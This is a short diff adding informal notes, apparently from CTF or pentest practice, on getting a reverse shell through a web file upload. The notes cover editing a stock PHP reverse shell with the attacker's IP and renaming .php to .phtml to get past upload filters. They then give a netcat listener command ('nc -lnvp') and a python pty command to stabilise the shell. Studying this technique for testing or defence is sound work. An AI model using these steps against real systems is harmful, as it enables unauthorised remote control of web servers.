@@ -1,0 +1,29 @@
+Reverse shell via file upload:
+
+get the reverse shell php file:
+/usr/share/webshells/php/php-reverse-shell.php
+
+copy the file into ur desktop and open it with nano and edit it
+
+ip: "Local_machine_ip" //
+
+note down the port number to listen.
+
+check if website allows to upload php file, else convert it into:
+
+.php to .phtml
+
+Now, upload the file into the website.
+
+Move to the terminal and use netcat to listen to the port
+
+cmd : nc -lnvp port_number
+
+now go the website and click the .phtml file to run.
+
+Now, in the terminal nc will detect it and create a shell.
+
+this cmd will help to create an stable connection.
+
+python -c ‘import pty;pty.spawn(“/bin/bash”)’
+
